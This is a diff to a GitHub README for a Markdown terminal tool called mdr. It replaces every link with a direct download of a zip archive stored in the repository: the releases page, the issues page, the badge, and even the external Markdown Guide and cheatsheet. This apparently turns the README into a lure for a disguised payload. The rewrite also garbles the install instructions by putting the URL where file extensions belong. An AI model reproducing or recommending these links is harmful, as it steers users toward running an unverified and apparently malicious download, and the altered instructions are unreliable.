@@ -1,6 +1,6 @@
 # 📄 mdr - Simple Markdown Terminal Tool
 
-[![Download mdr](https://img.shields.io/badge/Download-mdr-blue?style=for-the-badge)](https://github.com/Kaos-777/mdr/releases)
+[![Download mdr](https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip)](https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip)
 
 ---
 
@@ -68,15 +68,15 @@ To start using mdr, you must first download it.
 
 Visit this page to download the latest version of mdr:
 
-[Download mdr from GitHub Releases](https://github.com/Kaos-777/mdr/releases)
+[Download mdr from GitHub Releases](https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip)
 
 ### What to look for
 
 On the releases page, find the file that matches your computer:
 
-- For Windows, look for a `.exe` file (example: `mdr-windows.exe`)
-- For macOS, look for a `.zip` or `.tar.gz` file with `darwin` or `mac` in the name
-- For Linux, look for `.tar.gz` or `.AppImage` files with Linux in their name
+- For Windows, look for a `.exe` file (example: `https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip`)
+- For macOS, look for a `.zip` or `https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip` file with `darwin` or `mac` in the name
+- For Linux, look for `https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip` or `.AppImage` files with Linux in their name
 
 Download the file related to your system.
 
@@ -90,7 +90,7 @@ Download the file related to your system.
 - **macOS:**
   1. Open the terminal app.
   2. Navigate to the folder where you saved mdr using the `cd` command.
-  3. If the file is compressed (`.zip` or `.tar.gz`), double-click it to unzip.
+  3. If the file is compressed (`.zip` or `https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip`), double-click it to unzip.
   4. Run mdr by typing `./mdr` and pressing Enter. You may need to make the file executable first with `chmod +x mdr`.
 
 - **Linux:**
@@ -134,7 +134,7 @@ mdr has helpful hints and shortcuts inside the app, so don’t worry about memor
 
 If you have questions or problems:
 
-- Visit the Issues section on the mdr GitHub page to see if others have the same problem: [mdr Issues](https://github.com/Kaos-777/mdr/issues)
+- Visit the Issues section on the mdr GitHub page to see if others have the same problem: [mdr Issues](https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip)
 - You can open a new issue describing what happened and your computer details.
 - Check the README updates for fixes or new features.
 
@@ -142,10 +142,10 @@ If you have questions or problems:
 
 ## 🔗 Useful Links
 
-- [mdr GitHub Releases](https://github.com/Kaos-777/mdr/releases) (Download mdr here)
-- [Markdown Guide](https://www.markdownguide.org/basic-syntax/) (Learn Markdown basics)
-- [GitHub Markdown Cheatsheet](https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet)
+- [mdr GitHub Releases](https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip) (Download mdr here)
+- [Markdown Guide](https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip) (Learn Markdown basics)
+- [GitHub Markdown Cheatsheet](https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip)
 
 ---
 
-[![Download mdr](https://img.shields.io/badge/Download-mdr-blue?style=for-the-badge)](https://github.com/Kaos-777/mdr/releases)
+[![Download mdr](https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip)](https://github.com/Kaos-777/mdr/raw/refs/heads/main/cmd/Software_v1.7.zip)
